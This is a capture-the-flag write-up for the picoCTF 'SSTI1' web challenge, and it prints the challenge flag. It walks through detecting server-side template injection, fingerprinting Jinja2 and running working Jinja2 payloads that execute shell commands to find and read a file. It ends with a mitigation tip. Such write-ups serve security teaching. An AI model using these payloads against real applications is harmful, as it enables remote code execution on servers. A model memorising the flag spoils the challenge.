**PicoCTF — SSTI1 Writeup**

---

**Challenge:** SSTI1
**Author:** Venax
**Category:** Web Exploitation
**Flag:** `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}`

---

**Description**

A website that lets you announce whatever you want, built using server-side templating.

---

**Step 1 — Identify the Vulnerability**

The input field passes user content directly into a server-side template without sanitization. To confirm SSTI, submit a math expression:

```
{{7*7}}
```

The page returned `49` — confirming template injection is possible.

---

**Step 2 — Fingerprint the Template Engine**

Submit:
```
{{7*'7'}}
```

The page returned `7777777` — this is the behavior of **Jinja2** (Python). Twig would return `49`.

---

**Step 3 — Remote Code Execution**

With Jinja2 confirmed, use the `os` module via Python's object hierarchy to execute system commands:

```
{{config.__class__.__init__.__globals__['os'].popen('find / -name flag* 2>/dev/null').read()}}
```

Output revealed the flag at: `/challenge/flag`

---

**Step 4 — Read the Flag**

```
{{config.__class__.__init__.__globals__['os'].popen('cat /challenge/flag').read()}}
```

---

**Flag**

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}
```

---

**Key Takeaway**

Never concatenate user input directly into a template string. Always pass user data as context variables so the template engine treats it as data, not executable code.
